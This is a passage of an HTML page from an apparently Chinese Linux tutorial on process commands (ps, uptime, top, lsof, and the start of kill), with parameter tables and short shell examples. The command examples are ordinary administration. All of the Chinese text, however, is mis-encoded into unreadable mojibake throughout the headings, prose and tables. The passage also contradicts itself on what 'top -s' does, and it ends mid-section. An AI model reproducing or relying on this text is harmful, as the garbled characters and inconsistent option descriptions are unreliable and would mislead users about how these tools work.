ç”¨äº†è¿‡å¤šçš„èµ„æºç­‰ç­‰ï¼Œæ€»ä¹‹å¤§éƒ¨åˆ†ä¿¡æ¯éƒ½æ˜¯å¯ä»¥é€šè¿‡æ‰§è¡Œè¯¥å‘½ä»¤å¾—åˆ°çš„ã€‚<br>è¯­æ³•æ ¼å¼ï¼š<code>ps [å‚æ•°]</code></p><p>ä¸‹è¡¨æè¿°äº†é€šå¸¸å‡ºç°åœ¨ ps è¾“å‡ºä¸­çš„åˆ—çš„å«ä¹‰ï¼š</p><table><thead><tr><th><strong>åˆ—æ ‡é¢˜</strong></th><th><strong>è§£é‡Š</strong></th></tr></thead><tbody><tr><td>%CPU</td><td>è¿›ç¨‹ä½¿ç”¨äº†å¤šå°‘ CPU</td></tr><tr><td>%MEM</td><td>è¿›ç¨‹ä½¿ç”¨äº†å¤šå°‘å†…å­˜</td></tr><tr><td>ADDR</td><td>è¿›ç¨‹çš„å†…å­˜åœ°å€</td></tr><tr><td>C æˆ– CP</td><td>CPU ä½¿ç”¨ç‡å’Œè°ƒåº¦ä¿¡æ¯</td></tr><tr><td>COMMAND*</td><td>è¿›ç¨‹çš„åç§°ï¼ŒåŒ…æ‹¬å‚æ•°ï¼Œå¦‚æœæœ‰çš„è¯</td></tr><tr><td>NI</td><td>nice ä»·å€¼</td></tr><tr><td>F</td><td>æ——å¸œ</td></tr><tr><td>PID</td><td>è¿›ç¨‹æ ‡è¯†å·</td></tr><tr><td>PPID</td><td>è¿›ç¨‹çš„çˆ¶è¿›ç¨‹çš„ ID å·</td></tr><tr><td>PRI</td><td>è¿›ç¨‹çš„ä¼˜å…ˆçº§</td></tr><tr><td>RSS</td><td>å®é™…å†…å­˜ä½¿ç”¨</td></tr><tr><td>S æˆ– STAT</td><td>è¿›ç¨‹çŠ¶æ€ç </td></tr><tr><td>START æˆ– STIME</td><td>è¿›ç¨‹å¼€å§‹çš„æ—¶é—´</td></tr><tr><td>SZ</td><td>è™šæ‹Ÿå†…å­˜ä½¿ç”¨</td></tr><tr><td>TIME</td><td>æ€» CPU ä½¿ç”¨ç‡</td></tr><tr><td>TT æˆ– TTY</td><td>ä¸è¿›ç¨‹å…³è”çš„ç»ˆç«¯</td></tr><tr><td>UID æˆ– USER</td><td>è¿›ç¨‹æ‰€æœ‰è€…çš„ç”¨æˆ·å</td></tr><tr><td>WCHAN</td><td>è¿›ç¨‹æ­£åœ¨ç­‰å¾…çš„äº‹ä»¶çš„å†…å­˜åœ°å€</td></tr></tbody></table><h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>a</td><td>æ˜¾ç¤ºè·Ÿå½“å‰ç»ˆç«¯å…³è”çš„æ‰€æœ‰è¿›ç¨‹</td></tr><tr><td>u</td><td>åŸºäºç”¨æˆ·çš„æ ¼å¼æ˜¾ç¤º</td></tr><tr><td>x</td><td>æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ï¼Œä¸ä»¥ç»ˆç«¯æœºæ¥åŒºåˆ†</td></tr><tr><td>-e</td><td>æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹</td></tr><tr><td>-f</td><td>ä»¥å®Œæ•´æ ¼å¼è¾“å‡º</td></tr></tbody></table><h3 id="ç”¨ä¾‹"><a href="#ç”¨ä¾‹" class="headerlink" title="ç”¨ä¾‹"></a>ç”¨ä¾‹</h3><h4 id="ä»¥-BSD-æ ¼å¼æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹"><a href="#ä»¥-BSD-æ ¼å¼æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹" class="headerlink" title="ä»¥ BSD æ ¼å¼æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹"></a>ä»¥ BSD æ ¼å¼æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -aux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="æŸ¥çœ‹å®Œæ•´æ ¼å¼çš„æ‰€æœ‰è¿›ç¨‹"><a href="#æŸ¥çœ‹å®Œæ•´æ ¼å¼çš„æ‰€æœ‰è¿›ç¨‹" class="headerlink" title="æŸ¥çœ‹å®Œæ•´æ ¼å¼çš„æ‰€æœ‰è¿›ç¨‹"></a>æŸ¥çœ‹å®Œæ•´æ ¼å¼çš„æ‰€æœ‰è¿›ç¨‹</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·ä¿¡æ¯"><a href="#æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·ä¿¡æ¯" class="headerlink" title="æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·ä¿¡æ¯"></a>æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·ä¿¡æ¯</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -u root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="æŒ‰-CPU-èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº"><a href="#æŒ‰-CPU-èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº" class="headerlink" title="æŒ‰ CPU èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº"></a>æŒ‰ CPU èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">sort</span> -nk 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="æŒ‰å†…å­˜èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº"><a href="#æŒ‰å†…å­˜èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº" class="headerlink" title="æŒ‰å†…å­˜èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº"></a>æŒ‰å†…å­˜èµ„æºçš„ä½¿ç”¨é‡è¿›è¡Œæ’åº</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">sort</span> -rnk 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="æŸ¥çœ‹è¿›ç¨‹-PID"><a href="#æŸ¥çœ‹è¿›ç¨‹-PID" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹ PID"></a>æŸ¥çœ‹è¿›ç¨‹ PID</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -C process_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="å°†-ps-å‘½ä»¤ä¸-grep-ä¸€èµ·ä½¿ç”¨"><a href="#å°†-ps-å‘½ä»¤ä¸-grep-ä¸€èµ·ä½¿ç”¨" class="headerlink" title="å°† ps å‘½ä»¤ä¸ grep ä¸€èµ·ä½¿ç”¨"></a>å°† ps å‘½ä»¤ä¸ grep ä¸€èµ·ä½¿ç”¨</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> systemd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h2 id="å…­ã€uptime-æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½"><a href="#å…­ã€uptime-æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½" class="headerlink" title="å…­ã€uptime æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½"></a>å…­ã€uptime æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>Linux ç³»ç»Ÿä¸­çš„ uptime å‘½ä»¤ä¸»è¦ç”¨äºè·å–ä¸»æœºè¿è¡Œæ—¶é—´å’ŒæŸ¥è¯¢ Linux ç³»ç»Ÿè´Ÿè½½ç­‰ä¿¡æ¯ã€‚<br>uptime å‘½ä»¤å¯ä»¥æ˜¾ç¤ºç³»ç»Ÿå·²ç»è¿è¡Œäº†å¤šé•¿æ—¶é—´ï¼Œä¿¡æ¯æ˜¾ç¤ºä¾æ¬¡ä¸ºï¼šç°åœ¨æ—¶é—´ã€ç³»ç»Ÿå·²ç»è¿è¡Œäº†å¤šé•¿æ—¶é—´ã€ç›®å‰æœ‰å¤šå°‘ç™»å½•ç”¨æˆ·ã€ç³»ç»Ÿåœ¨è¿‡å»çš„ 1 åˆ†é’Ÿã€5 åˆ†é’Ÿå’Œ 15 åˆ†é’Ÿå†…çš„å¹³å‡è´Ÿè½½ã€‚ uptime å‘½ä»¤ç”¨æ³•ååˆ†ç®€å•ï¼Œç›´æ¥è¾“å…¥ uptime å³å¯æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½æƒ…å†µã€‚<br>â€‹</p><p>è¯­æ³•æ ¼å¼ï¼š<code>uptime [å‚æ•°]</code><br>â€‹</p><h3 id="å¸¸ç”¨å‚æ•°-1"><a href="#å¸¸ç”¨å‚æ•°-1" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>-p</td><td>ä»¥æ¼‚äº®çš„æ ¼å¼æ˜¾ç¤ºæœºå™¨æ­£å¸¸è¿è¡Œçš„æ—¶é—´</td></tr><tr><td>-s</td><td>ç³»ç»Ÿè‡ªå¼€å§‹è¿è¡Œæ—¶é—´ï¼Œæ ¼å¼ä¸º yyyy-mm-dd hh:mm:ss</td></tr><tr><td>-h</td><td>æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯</td></tr></tbody></table><h3 id="ç”¨ä¾‹-1"><a href="#ç”¨ä¾‹-1" class="headerlink" title="ç”¨ä¾‹"></a>ç”¨ä¾‹</h3><h4 id="æ˜¾ç¤ºå½“å‰ç³»ç»Ÿè¿è¡Œè´Ÿè½½æƒ…å†µ"><a href="#æ˜¾ç¤ºå½“å‰ç³»ç»Ÿè¿è¡Œè´Ÿè½½æƒ…å†µ" class="headerlink" title="æ˜¾ç¤ºå½“å‰ç³»ç»Ÿè¿è¡Œè´Ÿè½½æƒ…å†µ"></a>æ˜¾ç¤ºå½“å‰ç³»ç»Ÿè¿è¡Œè´Ÿè½½æƒ…å†µ</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">uptime</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ˜¾ç¤ºæœºå™¨æ­£å¸¸è¿è¡Œçš„æ—¶é—´"><a href="#æ˜¾ç¤ºæœºå™¨æ­£å¸¸è¿è¡Œçš„æ—¶é—´" class="headerlink" title="æ˜¾ç¤ºæœºå™¨æ­£å¸¸è¿è¡Œçš„æ—¶é—´"></a>æ˜¾ç¤ºæœºå™¨æ­£å¸¸è¿è¡Œçš„æ—¶é—´</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">uptime</span> -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ˜¾ç¤ºæœºå™¨å¯åŠ¨æ—¶é—´"><a href="#æ˜¾ç¤ºæœºå™¨å¯åŠ¨æ—¶é—´" class="headerlink" title="æ˜¾ç¤ºæœºå™¨å¯åŠ¨æ—¶é—´"></a>æ˜¾ç¤ºæœºå™¨å¯åŠ¨æ—¶é—´</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">uptime</span> -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸ƒã€top-å®æ—¶æ˜¾ç¤ºè¿›ç¨‹åŠ¨æ€"><a href="#ä¸ƒã€top-å®æ—¶æ˜¾ç¤ºè¿›ç¨‹åŠ¨æ€" class="headerlink" title="ä¸ƒã€top å®æ—¶æ˜¾ç¤ºè¿›ç¨‹åŠ¨æ€"></a>ä¸ƒã€top å®æ—¶æ˜¾ç¤ºè¿›ç¨‹åŠ¨æ€</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>top å‘½ä»¤æ˜¯ Linux ä¸‹å¸¸ç”¨çš„æ€§èƒ½åˆ†æå·¥å…·ï¼Œèƒ½å¤Ÿå®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­å„ä¸ªè¿›ç¨‹çš„èµ„æºå ç”¨çŠ¶å†µï¼Œå¸¸ç”¨äºæœåŠ¡ç«¯æ€§èƒ½åˆ†æã€‚<br>åœ¨ top å‘½ä»¤ä¸­æŒ‰ f æŒ‰å¯ä»¥æŸ¥çœ‹æ˜¾ç¤ºçš„åˆ—ä¿¡æ¯ï¼ŒæŒ‰å¯¹åº”å­—æ¯æ¥å¼€å¯/å…³é—­åˆ—ï¼Œå¤§å†™å­—æ¯è¡¨ç¤ºå¼€å¯ï¼Œå°å†™å­—æ¯è¡¨ç¤ºå…³é—­ã€‚å¸¦*å·çš„æ˜¯é»˜è®¤åˆ—ã€‚<br>â€‹</p><p>è¯­æ³•æ ¼å¼ï¼š<code>top [å‚æ•°]</code><br>â€‹</p><h3 id="å¸¸ç”¨å‚æ•°-2"><a href="#å¸¸ç”¨å‚æ•°-2" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>-d</td><td>æ”¹å˜æ˜¾ç¤ºçš„æ›´æ–°é€Ÿåº¦ï¼Œæˆ–æ˜¯åœ¨äº¤è°ˆå¼æŒ‡ä»¤åˆ—( interactive command)æŒ‰ s</td></tr><tr><td>-q</td><td>æ²¡æœ‰ä»»ä½•å»¶è¿Ÿçš„æ˜¾ç¤ºé€Ÿåº¦ï¼Œå¦‚æœä½¿ç”¨è€…æ˜¯æœ‰ superuser çš„æƒé™ï¼Œåˆ™ top å°†ä¼šä»¥æœ€é«˜çš„ä¼˜å…ˆåºæ‰§è¡Œ</td></tr><tr><td>-c</td><td>åˆ‡æ¢æ˜¾ç¤ºæ¨¡å¼</td></tr><tr><td>-s</td><td>å®‰å…¨æ¨¡å¼ï¼Œå°†äº¤è°ˆå¼æŒ‡ä»¤å–æ¶ˆ, é¿å…æ½œåœ¨çš„å±æœº</td></tr><tr><td>-i</td><td>ä¸æ˜¾ç¤ºä»»ä½•é—²ç½® (idle) æˆ–æ— ç”¨ (zombie) çš„è¡Œç¨‹</td></tr><tr><td>-n</td><td>æ›´æ–°çš„æ¬¡æ•°ï¼Œå®Œæˆåå°†ä¼šé€€å‡º top</td></tr><tr><td>-b</td><td>æ‰¹æ¬¡æ¡£æ¨¡å¼ï¼Œæ­é… â€œnâ€ å‚æ•°ä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥ç”¨æ¥å°† top çš„ç»“æœè¾“å‡ºåˆ°æ¡£æ¡ˆå†…</td></tr></tbody></table><h3 id="top-å¿«æ·é”®"><a href="#top-å¿«æ·é”®" class="headerlink" title="top å¿«æ·é”®"></a>top å¿«æ·é”®</h3><ul><li>sï¼šä¿®æ”¹åˆ·æ–°æ—¶é—´ï¼Œé»˜è®¤ 3s åˆ·æ–°ä¸€æ¬¡</li><li>ç©ºæ ¼é”®ï¼šç«‹å³åˆ·æ–°</li><li>qï¼šé€€å‡º</li><li>Pï¼šæŒ‰ CPU æ’åº</li><li>Mï¼šæŒ‰å†…å­˜æ’åº</li><li>Tï¼šæŒ‰æ—¶é—´æ’åº</li><li>pï¼šè¿›ç¨‹ IPï¼ŒæŸ¥çœ‹æŸä¸ªè¿›ç¨‹çŠ¶æ€</li><li>1ï¼šæ˜¾ç¤ºæ¯ä¸ªå†…æ ¸çš„ CPU ä½¿ç”¨ç‡</li><li>u/Uï¼šæŒ‡å®šæ˜¾ç¤ºçš„ç”¨æˆ·</li><li>hï¼šå¸®åŠ©</li></ul><h3 id="ç”¨ä¾‹-2"><a href="#ç”¨ä¾‹-2" class="headerlink" title="ç”¨ä¾‹"></a>ç”¨ä¾‹</h3><h4 id="æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯"><a href="#æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯" class="headerlink" title="æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯"></a>æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ˜¾ç¤ºå®Œæ•´çš„è¿›ç¨‹ä¿¡æ¯"><a href="#æ˜¾ç¤ºå®Œæ•´çš„è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="æ˜¾ç¤ºå®Œæ•´çš„è¿›ç¨‹ä¿¡æ¯"></a>æ˜¾ç¤ºå®Œæ•´çš„è¿›ç¨‹ä¿¡æ¯</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä»¥æ‰¹å¤„ç†æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯"><a href="#ä»¥æ‰¹å¤„ç†æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯" class="headerlink" title="ä»¥æ‰¹å¤„ç†æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯"></a>ä»¥æ‰¹å¤„ç†æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä»¥ç´¯ç§¯æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯"><a href="#ä»¥ç´¯ç§¯æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯" class="headerlink" title="ä»¥ç´¯ç§¯æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯"></a>ä»¥ç´¯ç§¯æ¨¡å¼æ˜¾ç¤ºç¨‹åºä¿¡æ¯</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è®¾ç½®ä¿¡æ¯æ›´æ–°æ¬¡æ•°"><a href="#è®¾ç½®ä¿¡æ¯æ›´æ–°æ¬¡æ•°" class="headerlink" title="è®¾ç½®ä¿¡æ¯æ›´æ–°æ¬¡æ•°"></a>è®¾ç½®ä¿¡æ¯æ›´æ–°æ¬¡æ•°</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">top</span> -n 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å…«ã€lsof-æŸ¥è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶"><a href="#å…«ã€lsof-æŸ¥è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶" class="headerlink" title="å…«ã€lsof æŸ¥è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶"></a>å…«ã€lsof æŸ¥è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶</h2><h3 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>lsof å‘½ä»¤ç”¨äºæŸ¥çœ‹è¿›ç¨‹å¼€æ‰“çš„æ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶çš„è¿›ç¨‹ï¼Œè¿›ç¨‹æ‰“å¼€çš„ç«¯å£(TCPã€UDP),æ‰¾å›/æ¢å¤åˆ é™¤çš„æ–‡ä»¶ã€‚æ˜¯ååˆ†æ–¹ä¾¿çš„ç³»ç»Ÿç›‘è§†å·¥å…·ï¼Œå› ä¸º lsof å‘½ä»¤éœ€è¦è®¿é—®æ ¸å¿ƒå†…å­˜å’Œå„ç§æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦ root ç”¨æˆ·æ‰§è¡Œã€‚<br>â€‹</p><p>è¯­æ³•æ ¼å¼ï¼š<code>lsof [å‚æ•°] [æ–‡ä»¶]</code><br>â€‹</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><pre class="line-numbers language-bash"><code class="language-bash">apt <span class="token function">install</span> <span class="token function">lsof</span><span class="token comment" spellcheck="true"># æˆ–</span>yum <span class="token function">install</span> <span class="token function">lsof</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å¸¸ç”¨å‚æ•°-3"><a href="#å¸¸ç”¨å‚æ•°-3" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>-a</td><td>åˆ—å‡ºæ‰“å¼€æ–‡ä»¶å­˜åœ¨çš„è¿›ç¨‹</td></tr><tr><td>-c &lt;è¿›ç¨‹å&gt;</td><td>åˆ—å‡ºæŒ‡å®šè¿›ç¨‹æ‰€æ‰“å¼€çš„æ–‡ä»¶</td></tr><tr><td>-g</td><td>åˆ—å‡º GID å·è¿›ç¨‹è¯¦æƒ…</td></tr><tr><td>-d &lt;æ–‡ä»¶å·&gt;</td><td>åˆ—å‡ºå ç”¨è¯¥æ–‡ä»¶å·çš„è¿›ç¨‹</td></tr><tr><td>+d &lt;ç›®å½•&gt;</td><td>åˆ—å‡ºç›®å½•ä¸‹è¢«æ‰“å¼€çš„æ–‡ä»¶</td></tr><tr><td>+D &lt;ç›®å½•&gt;</td><td>é€’å½’åˆ—å‡ºç›®å½•ä¸‹è¢«æ‰“å¼€çš„æ–‡ä»¶</td></tr><tr><td>-n &lt;ç›®å½•&gt;</td><td>åˆ—å‡ºä½¿ç”¨ NFS çš„æ–‡ä»¶</td></tr><tr><td>-i &lt;æ¡ä»¶&gt;</td><td>åˆ—å‡ºç¬¦åˆæ¡ä»¶çš„è¿›ç¨‹</td></tr><tr><td>-p &lt;è¿›ç¨‹å·&gt;</td><td>åˆ—å‡ºæŒ‡å®šè¿›ç¨‹å·æ‰€æ‰“å¼€çš„æ–‡ä»¶</td></tr><tr><td>-u</td><td>åˆ—å‡º UID å·è¿›ç¨‹è¯¦æƒ…</td></tr><tr><td>-h</td><td>æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯</td></tr><tr><td>-v</td><td>æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯</td></tr></tbody></table><h3 id="ç”¨ä¾‹-3"><a href="#ç”¨ä¾‹-3" class="headerlink" title="ç”¨ä¾‹"></a>ç”¨ä¾‹</h3><h4 id="æŸ¥çœ‹æ–‡ä»¶çš„è¿›ç¨‹ä¿¡æ¯"><a href="#æŸ¥çœ‹æ–‡ä»¶çš„è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶çš„è¿›ç¨‹ä¿¡æ¯"></a>æŸ¥çœ‹æ–‡ä»¶çš„è¿›ç¨‹ä¿¡æ¯</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åˆ—å‡º-GID-å·è¿›ç¨‹è¯¦æƒ…"><a href="#åˆ—å‡º-GID-å·è¿›ç¨‹è¯¦æƒ…" class="headerlink" title="åˆ—å‡º GID å·è¿›ç¨‹è¯¦æƒ…"></a>åˆ—å‡º GID å·è¿›ç¨‹è¯¦æƒ…</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åˆ—å‡ºç›®å½•ä¸‹è¢«æ‰“å¼€çš„æ–‡ä»¶"><a href="#åˆ—å‡ºç›®å½•ä¸‹è¢«æ‰“å¼€çš„æ–‡ä»¶" class="headerlink" title="åˆ—å‡ºç›®å½•ä¸‹è¢«æ‰“å¼€çš„æ–‡ä»¶"></a>åˆ—å‡ºç›®å½•ä¸‹è¢«æ‰“å¼€çš„æ–‡ä»¶</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> +d /root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ç‰¹å®šç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶"><a href="#ç‰¹å®šç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶" class="headerlink" title="ç‰¹å®šç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶"></a>ç‰¹å®šç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">lsof</span> -u root <span class="token operator">|</span> <span class="token function">less</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åˆ—å‡ºç‰¹å®šè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶"><a href="#åˆ—å‡ºç‰¹å®šè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶" class="headerlink" title="åˆ—å‡ºç‰¹å®šè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶"></a>åˆ—å‡ºç‰¹å®šè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -p <span class="token operator">&lt;</span>PID<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="åˆ—å‡ºæ‰“å¼€çš„ç½‘ç»œæ–‡ä»¶"><a href="#åˆ—å‡ºæ‰“å¼€çš„ç½‘ç»œæ–‡ä»¶" class="headerlink" title="åˆ—å‡ºæ‰“å¼€çš„ç½‘ç»œæ–‡ä»¶"></a>åˆ—å‡ºæ‰“å¼€çš„ç½‘ç»œæ–‡ä»¶</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h4 id="æ ¹æ®å‘½ä»¤æŸ¥æ‰¾æ‰“å¼€çš„æ–‡ä»¶"><a href="#æ ¹æ®å‘½ä»¤æŸ¥æ‰¾æ‰“å¼€çš„æ–‡ä»¶" class="headerlink" title="æ ¹æ®å‘½ä»¤æŸ¥æ‰¾æ‰“å¼€çš„æ–‡ä»¶"></a>æ ¹æ®å‘½ä»¤æŸ¥æ‰¾æ‰“å¼€çš„æ–‡ä»¶</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">lsof</span> -c <span class="token operator">&lt;</span>COMMAND<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¹ã€å‰åå°è¿›ç¨‹åˆ‡æ¢"><a href="#ä¹ã€å‰åå°è¿›ç¨‹åˆ‡æ¢" class="headerlink" title="ä¹ã€å‰åå°è¿›ç¨‹åˆ‡æ¢"></a>ä¹ã€å‰åå°è¿›ç¨‹åˆ‡æ¢</h2><blockquote><p>â€‹<a href="https://truda.puuuq.cn/post/8ed3ed3a.html">Linux ä»»åŠ¡çš„å‰åå°ç®¡ç†</a></p></blockquote><h2 id="åã€kill-å…³é—­è¿›ç¨‹"><a href="#åã€kill-å…³é—­è¿›ç¨‹" class="headerlink" title="åã€kill å…³é—­è¿›ç¨‹"></a>åã€kill å…³é—­è¿›ç¨‹</h2><h3 id="ä»‹ç»-3"><a href="#ä»‹ç»-3" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>kill æ­£å¦‚è¿™ä¸ªå•è¯çš„æ„æ€ä¸€æ ·ï¼Œå°±æ˜¯æ€æ­»ï¼Œlinux ç³»ç»Ÿä¸­ kill å‘½ä»¤ç”¨æ¥åˆ é™¤æ‰§è¡Œä¸­çš„ç¨‹åºæˆ–å·¥ä½œã€‚<br>kill å‘½ä»¤å¯å°†æŒ‡å®šçš„ä¿¡å·å‘é€ç»™ç›¸åº”çš„è¿›ç¨‹æˆ–å·¥ä½œã€‚ kill å‘½ä»¤é»˜è®¤ä½¿ç”¨ä¿¡å·ä¸º 15ï¼Œç”¨äºç»“æŸè¿›ç¨‹æˆ–å·¥ä½œã€‚å¦‚æœè¿›ç¨‹æˆ–å·¥ä½œå¿½ç•¥æ­¤ä¿¡å·ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä¿¡å· 9ï¼Œå¼ºåˆ¶æ€æ­»è¿›ç¨‹æˆ–ä½œä¸šã€‚</p><p>è¯­æ³•æ ¼å¼ï¼š<code>kill [å‚æ•°] [è¿›ç¨‹å·]</code><br>â€‹</p><h3 id="kill-å‘½ä»¤çš„è¿›ç¨‹ç»ˆæ­¢ä¿¡å·"><a href="#kill-å‘½ä»¤çš„è¿›ç¨‹ç»ˆæ­¢ä¿¡å·" class="headerlink" title="kill å‘½ä»¤çš„è¿›ç¨‹ç»ˆæ­¢ä¿¡å·"></a>kill 